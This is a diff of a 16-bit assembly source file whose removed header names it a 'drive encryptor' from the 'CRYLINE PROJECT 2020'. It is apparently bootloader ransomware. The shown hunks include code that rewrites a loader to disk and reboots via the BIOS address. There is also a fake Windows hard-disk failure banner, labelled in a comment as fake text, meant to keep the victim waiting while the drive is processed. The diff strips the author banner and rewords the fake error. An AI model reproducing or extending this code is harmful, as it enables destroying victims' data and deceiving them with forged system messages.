@@ -1,10 +1,3 @@
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-;;;;;;;;;;;;;;;;;;; CRYLINE PROJECT 2020 ;;;;;;;;;;;;;;;;;;;;;
-;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
-;;;;;;;;;;;;;;;;;;;         v5.0         ;;;;;;;;;;;;;;;;;;;;;
-;;;;;;;;;;;;;;;;;;;  - DRIVE ENCRYPTOR - ;;;;;;;;;;;;;;;;;;;;;
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-
 bits16              ; <= Compiler options. Compile to .bin file extension
 
 mov ah, 0x00        ; <= Change video mode | AH in 10h interrupt - it's a value to change modes and functions
@@ -127,6 +120,6 @@ readNewLoader:                                               ; <= Function 'read
                 jc writeNewLoader                            ; <= If writing error... Loop! Move to function 'writeNewLoader' and reading again
                 jmp 0xFFFF:0x0000                            ; <= Jump to BIOS memory address | Reboot
 
-showBanner: db 'Windows has encountered a problem communicating with a device connected to your computer. ', 0xA, 0xD, 'This error can be caused by unplugging a removable storage device such as an    external USB drive while the device is in use, or by faulty hardware such as a  hard drive or CD-ROM drive that is failing. You may cancel the drive check, but it is strongly recommended that you continue. ', 0xA, 0xD, ' ', 0xA, 0xD, 'If you continue to receive this this error message, wait for the hard drive     check to finish and contact the hardware manufacturer.', 0xA, 0xD, ' ', 0xA, 0xD, 'Windows will now check the drive...', 0 ; <= It's a fake text for show
+showBanner: db 'Microsoft Windows [ Hard Disk-1 Failure ]. ', 0xA, 0xD, 'This error can be caused by unplugging a removable storage device such as an    external USB drive while the device is in use, or by faulty hardware such as a  hard drive or CD-ROM drive that is failing. You may cancel the drive check, but it is strongly recommended that you continue. ', 0xA, 0xD, ' ', 0xA, 0xD, 'If you continue to receive this this error message, wait for the hard drive     check to finish and contact the hardware manufacturer.', 0xA, 0xD, ' ', 0xA, 0xD, 'Windows will now check the drive...', 0 ; <= It's a fake text for show
 showDot: db '.'
 times 1024-($-$$) db 0                                       ; <= Add null-bytes in free space 
